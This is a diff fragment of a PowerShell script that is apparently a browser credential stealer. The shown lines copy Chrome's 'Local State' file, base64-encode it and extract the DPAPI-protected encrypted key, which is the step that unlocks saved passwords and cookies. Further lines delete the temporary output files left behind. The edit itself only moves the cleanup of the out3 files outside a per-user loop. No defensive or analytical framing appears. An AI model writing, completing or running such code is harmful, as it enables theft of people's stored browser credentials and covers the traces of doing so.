@@ -6,6 +6,7 @@ Add-Type -AssemblyName System.Security
 Copy-Item "$($env:USERPROFILE)\AppData\Local\Google\Chrome\User Data\Local State" "$($env:USERPROFILE)\out3.f"
 $base64string3 = [Convert]::ToBase64String([IO.File]::ReadAllBytes("$($env:USERPROFILE)\out3.f"))
 echo $base64string3 > "$($env:USERPROFILE)\out3.txt"
+
 $localStateInfo      = Get-Content "$($env:USERPROFILE)\out3.f" -Raw | ConvertFrom-Json
 if ($localStateInfo) {$encryptedkey = [convert]::FromBase64String($localStateInfo.os_crypt.encrypted_key)}
 if ($encryptedkey -and [string]::new($encryptedkey[0..4]) -eq 'DPAPI') {
@@ -37,12 +38,12 @@ For ($i=0; $i -lt $users.Length; $i++) {
 
     Remove-Item "$($env:USERPROFILE)\out.txt"
     Remove-Item "$($env:USERPROFILE)\out2.txt"
-    Remove-Item "$($env:USERPROFILE)\out3.txt"
     Remove-Item "$($env:USERPROFILE)\out4.txt"
     Remove-Item "$($env:USERPROFILE)\out5.txt"
     Remove-Item "$($env:USERPROFILE)\out.f"
     Remove-Item "$($env:USERPROFILE)\out2.f"
-    Remove-Item "$($env:USERPROFILE)\out3.f"
     Remove-Item "$($env:USERPROFILE)\out4.f"
     Remove-Item "$($env:USERPROFILE)\out5.f"
 }
+Remove-Item "$($env:USERPROFILE)\out3.txt"
+Remove-Item "$($env:USERPROFILE)\out3.f"
